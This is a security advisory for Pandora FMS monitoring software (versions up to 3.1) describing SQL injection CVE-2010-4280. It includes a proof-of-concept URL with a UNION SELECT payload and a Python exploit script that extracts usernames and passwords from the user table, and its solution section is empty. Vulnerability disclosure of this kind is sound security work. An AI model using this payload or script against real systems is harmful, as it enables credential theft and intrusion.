[+] Introduction

Pandora FMS (for Pandora Flexible Monitoring System) is a software
solution for monitoring computer networks. It allows monitoring in a
visual way the status and performance of several parameters from
different operating systems, servers, applications and hardware systems
such as firewalls, proxies, databases, web servers or routers.

It can be deployed in almost any operating system. It features remote
monitoring (WMI, SNMP, TCP. UDP, ICMP, HTTP...) and it can also use
agents. An agent is available for each platform. It can also monitor
hardware systems with a TCP/IP stack, such as load balancers, routers,
network switches, printers or firewalls.

This software has several servers that process and get information from
different sources, using WMI for gathering remote Windows information, a
predictive server, a plug-in server which makes complex user-defined
network tests, an advanced export server to replicate data between
different sites of Pandora FMS, a network discovery server, and an SNMP
Trap console.

Released under the terms of the GNU General Public License, Pandora FMS
is free software.

3) SQL Injection - CVE-2010-4280 - CVSS 8.5/10

The parameter id_group when get_agents_group_json is equal to 1 is
vulnerable to SQL Injection attacks.

PoC:
http://host/pandora_console/ajax.php?page=operation/agentes/ver_agente&get_agents_group_json=1&id_group=1/**/and/**/1=0/**/union/**/select/**/id_user,password/**/from/**/tusuario


Exploit:

# Pandora Flexible Monitoring System SQL Injection PoC
# Juan Galiana Lara
# Gets the list of users and password from the database
#
#configure cookie&host before use it
#usage
#python sqlinj_users.py

import json
import urllib2

headers = {"Cookie": "PHPSESSID=a4s3nf1tqv2fau8s6qhi6rutp9dahe9o"}

url = "http://HOST/pandora_console/ajax.php";
url+=
"?page=operation/agentes/ver_agente&get_agents_group_json=1&id_group=1"
url+=
"/**/and/**/1=0/**/union/**/select/**/id_user,password/**/from/**/tusuario"

req = urllib2.Request(url,headers=headers)
resp = urllib2.urlopen(req)

users = json.read(resp.read())
for user in users:
    print(user["id_agente"]+":"+user["nombre"])


The fix to these kind of issues was the implementation of a generic
filter against sql injection. A proper fix is planned for a major version.


[+] Impact

An attacker can execute commands of the operating system, inject remote
code in the context of the application, get arbitrary files from the
filesystem or extract any data of the database including passwords and
confidential information about the monitored network/systems. Also it is
possible to bypass the authentication or scale privileges to became
admin, gaining full control of the web application and web server. These
vulnerabilities have a high impact to the confidentiality, integrity,
and availability of the system.


[+] Systems affected

Versions prior and including 3.1 of Pandora FMS are affected


[+] Solution
